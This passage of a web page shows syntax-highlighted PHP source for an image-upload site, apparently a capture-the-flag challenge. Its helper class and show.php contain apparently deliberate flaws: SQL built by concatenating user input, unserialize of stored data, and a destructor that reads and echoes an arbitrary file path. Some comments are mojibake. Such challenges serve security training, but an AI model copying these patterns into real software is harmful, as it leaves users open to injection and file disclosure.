		<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$data</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
			<span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;Something wrong!&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span>
		<span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">insert_array</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">return</span> <span class="token variable">$id</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">insert_array</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span>
	<span class="token punctuation">{</span>	
		<span class="token comment">//mysqlè¿æ¥</span>
		<span class="token variable">$con</span> <span class="token operator">=</span> <span class="token function">mysqli_connect</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;127.0.0.1&quot;</span><span class="token punctuation">,</span><span class="token double-quoted-string string">&quot;r00t&quot;</span><span class="token punctuation">,</span><span class="token double-quoted-string string">&quot;r00t&quot;</span><span class="token punctuation">,</span><span class="token double-quoted-string string">&quot;pic_base&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">mysqli_connect_errno</span><span class="token punctuation">(</span><span class="token variable">$con</span><span class="token punctuation">)</span><span class="token punctuation">)</span> 
		<span class="token punctuation">{</span> 
		    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;Connect MySQL Fail:&quot;</span><span class="token punctuation">.</span><span class="token function">mysqli_connect_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span>

		<span class="token variable">$sql_fields</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token variable">$sql_val</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$data</span> <span class="token keyword">as</span> <span class="token variable">$key</span><span class="token operator">=</span><span class="token operator">&gt;</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
			<span class="token variable">$key_temp</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token single-quoted-string string">'*'</span><span class="token punctuation">.</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'\0\0\0'</span><span class="token punctuation">,</span> <span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token variable">$value_temp</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token single-quoted-string string">'*'</span><span class="token punctuation">.</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'\0\0\0'</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token variable">$sql_fields</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token double-quoted-string string">&quot;`&quot;</span><span class="token punctuation">.</span><span class="token variable">$key_temp</span><span class="token punctuation">.</span><span class="token double-quoted-string string">&quot;`&quot;</span><span class="token punctuation">;</span>
			<span class="token variable">$sql_val</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token double-quoted-string string">&quot;'&quot;</span><span class="token punctuation">.</span><span class="token variable">$value_temp</span><span class="token punctuation">.</span><span class="token double-quoted-string string">&quot;'&quot;</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span>
		<span class="token comment">//implode() å‡½æ•°è¿”å›ä¸€ä¸ªç”±æ•°ç»„å…ƒç´ ç»„åˆæˆçš„å­—ç¬¦ä¸²ã€‚</span>
		<span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token double-quoted-string string">&quot;INSERT INTO images (&quot;</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token function">implode</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;,&quot;</span><span class="token punctuation">,</span><span class="token variable">$sql_fields</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token double-quoted-string string">&quot;) VALUES(&quot;</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token function">implode</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;,&quot;</span><span class="token punctuation">,</span><span class="token variable">$sql_val</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token double-quoted-string string">&quot;)&quot;</span><span class="token punctuation">;</span>
		<span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$con</span><span class="token punctuation">,</span> <span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token comment">//mysqli_insert_id() å‡½æ•°è¿”å›æœ€åä¸€ä¸ªæŸ¥è¯¢ä¸­ç”Ÿæˆçš„IDå€¼</span>
		<span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">mysqli_insert_id</span><span class="token punctuation">(</span><span class="token variable">$con</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token function">mysqli_close</span><span class="token punctuation">(</span><span class="token variable">$con</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">return</span> <span class="token variable">$id</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">view_files</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">ifview</span> <span class="token operator">==</span> <span class="token boolean constant">False</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
			<span class="token keyword">return</span> <span class="token boolean constant">False</span><span class="token punctuation">;</span>
			<span class="token comment">//The function is not yet perfect, it is not open yet.</span>
		<span class="token punctuation">}</span>
		<span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">echo</span> <span class="token variable">$content</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
		<span class="token shell-comment comment"># Read some config html</span>
		<span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">view_files</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">config</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token delimiter important">?&gt;</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span class="line-number">47</span><br><span class="line-number">48</span><br><span class="line-number">49</span><br><span class="line-number">50</span><br><span class="line-number">51</span><br><span class="line-number">52</span><br><span class="line-number">53</span><br><span class="line-number">54</span><br><span class="line-number">55</span><br><span class="line-number">56</span><br><span class="line-number">57</span><br><span class="line-number">58</span><br><span class="line-number">59</span><br><span class="line-number">60</span><br><span class="line-number">61</span><br><span class="line-number">62</span><br><span class="line-number">63</span><br><span class="line-number">64</span><br><span class="line-number">65</span><br><span class="line-number">66</span><br><span class="line-number">67</span><br><span class="line-number">68</span><br><span class="line-number">69</span><br><span class="line-number">70</span><br><span class="line-number">71</span><br><span class="line-number">72</span><br><span class="line-number">73</span><br><span class="line-number">74</span><br><span class="line-number">75</span><br><span class="line-number">76</span><br><span class="line-number">77</span><br><span class="line-number">78</span><br><span class="line-number">79</span><br><span class="line-number">80</span><br><span class="line-number">81</span><br><span class="line-number">82</span><br><span class="line-number">83</span><br><span class="line-number">84</span><br><span class="line-number">85</span><br><span class="line-number">86</span><br><span class="line-number">87</span><br><span class="line-number">88</span><br><span class="line-number">89</span><br><span class="line-number">90</span><br><span class="line-number">91</span><br><span class="line-number">92</span><br><span class="line-number">93</span><br><span class="line-number">94</span><br><span class="line-number">95</span><br><span class="line-number">96</span><br><span class="line-number">97</span><br><span class="line-number">98</span><br><span class="line-number">99</span><br><span class="line-number">100</span><br><span class="line-number">101</span><br><span class="line-number">102</span><br><span class="line-number">103</span><br><span class="line-number">104</span><br><span class="line-number">105</span><br><span class="line-number">106</span><br><span class="line-number">107</span><br><span class="line-number">108</span><br></div></div><div class="language-php line-numbers-mode"><pre class="language-php"><code>//show.php

<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">&gt;</span></span>Show Images<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">&gt;</span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>stylesheet<span class="token punctuation">&quot;</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>./style.css<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>content-type<span class="token punctuation">&quot;</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>text/html;charset=UTF-8<span class="token punctuation">&quot;</span></span><span class="token punctuation">/&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span> <span class="token attr-name">align</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>center<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>Your images<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">&gt;</span></span>The function of viewing the image has not been completed, and currently only the contents of your image name can be saved. I hope you can forgive me and my colleagues and I are working hard to improve.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>hr</span><span class="token punctuation">&gt;</span></span>

<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;./helper.php&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$show</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token double-quoted-string string">&quot;delete_all&quot;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
	<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token double-quoted-string string">&quot;delete_all&quot;</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token double-quoted-string string">&quot;true&quot;</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
		<span class="token variable">$show</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">Delete_All_Images</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token variable">$show</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">Get_All_Images</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">class</span> <span class="token class-name">show</span><span class="token punctuation">{</span>
	<span class="token keyword">public</span> <span class="token variable">$con</span><span class="token punctuation">;</span>
	<span class="token comment">//è¿æ¥æ•°æ®åº“</span>
	<span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
		<span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">con</span> <span class="token operator">=</span> <span class="token function">mysqli_connect</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;127.0.0.1&quot;</span><span class="token punctuation">,</span><span class="token double-quoted-string string">&quot;r00t&quot;</span><span class="token punctuation">,</span><span class="token double-quoted-string string">&quot;r00t&quot;</span><span class="token punctuation">,</span><span class="token double-quoted-string string">&quot;pic_base&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">mysqli_connect_errno</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">con</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span> 
   			<span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;Connect MySQL Fail:&quot;</span><span class="token punctuation">.</span><span class="token function">mysqli_connect_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span>
	<span class="token punctuation">}</span>
	<span class="token comment">//è·å–å›¾ç‰‡ä¿¡æ¯</span>
	<span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">Get_All_Images</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
		<span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token double-quoted-string string">&quot;SELECT * FROM images&quot;</span><span class="token punctuation">;</span>
		<span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">con</span><span class="token punctuation">,</span> <span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$result</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">num_rows</span> <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
		    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token variable">$row</span> <span class="token operator">=</span> <span class="token variable">$result</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">fetch_assoc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
		    	<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token double-quoted-string string">&quot;attr&quot;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
					<span class="token comment">//è·å–æ¯ä¸€è¡Œçš„ä¿¡æ¯</span>
					<span class="token variable">$attr_temp</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'\0\0\0'</span><span class="token punctuation">,</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token single-quoted-string string">'*'</span><span class="token punctuation">.</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token double-quoted-string string">&quot;attr&quot;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
					<span class="token comment">//ååºåˆ—åŒ–attr</span>
					<span class="token variable">$attr</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$attr_temp</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
				<span class="token punctuation">}</span>
		        <span class="token keyword">echo</span> <span class="token double-quoted-string string">&quot;&lt;p&gt;id=&quot;</span><span class="token punctuation">.</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token double-quoted-string string">&quot;id&quot;</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token double-quoted-string string">&quot; filename=&quot;</span><span class="token punctuation">.</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token double-quoted-string string">&quot;filename&quot;</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token double-quoted-string string">&quot; path=&quot;</span><span class="token punctuation">.</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token double-quoted-string string">&quot;path&quot;</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token double-quoted-string string">&quot;&lt;/p&gt;&quot;</span><span class="token punctuation">;</span>
		    <span class="token punctuation">}</span>
		<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
		    <span class="token keyword">echo</span> <span class="token double-quoted-string string">&quot;&lt;p&gt;You have not uploaded an image yet.&lt;/p&gt;&quot;</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span>
		<span class="token function">mysqli_close</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">con</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">Delete_All_Images</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
		<span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token double-quoted-string string">&quot;DELETE FROM images&quot;</span><span class="token punctuation">;</span>
		<span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">con</span><span class="token punctuation">,</span> <span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token delimiter important">?&gt;</span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>show.php?delete_all=true<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>Delete All Images<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>upload.php<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>Upload Images<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span class="line-number">47</span><br><span class="line-number">48</span><br><span class="line-number">49</span><br><span class="line-number">50</span><br><span class="line-number">51</span><br><span class="line-number">52</span><br><span class="line-number">53</span><br><span class="line-number">54</span><br><span class="line-number">55</span><br><span class="line-number">56</span><br><span class="line-number">57</span><br><span class="line-number">58</span><br><span class="line-number">59</span><br><span class="line-number">60</span><br><span class="line-number">61</span><br><span class="line-number">62</span><br><span class="line-number">63</span><br><span class="line-number">64</span><br><span class="line-number">65</span><br><span class="line-number">66</span><br></div></div><div class="language-php line-numbers-mode"><pre class="language-php"><code>//upload.php

<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">&gt;</span></span>Image Upload<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">&gt;</span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>stylesheet<span class="token punctuation">&quot;</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>./style.css<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>content-type<span class="token punctuation">&quot;</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>text/html;charset=UTF-8<span class="token punctuation">&quot;</span></span><span class="token punctuation">/&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span> <span class="token attr-name">align</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>center<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>https://i.loli.net/2019/10/06/i5GVSYnB1mZRaFj.png<span class="token punctuation">&quot;</span></span> <span class="token attr-name">width</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>300</span> <span class="token attr-name">length</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>150</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">align</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>center<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>upload<span class="token punctuation">&quot;</span></span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span><span class="token punctuation">&quot;</span></span>  <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>post<span class="token punctuation">&quot;</span></span> <span class="token attr-name">enctype</span> <span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>multipart/form-data<span class="token punctuation">&quot;</span></span> <span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>file<span class="token punctuation">&quot;</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>file<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>Submit<span class="token punctuation">&quot;</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>submit<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span> 
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>./show.php<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>You can view the pictures you uploaded here<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span>
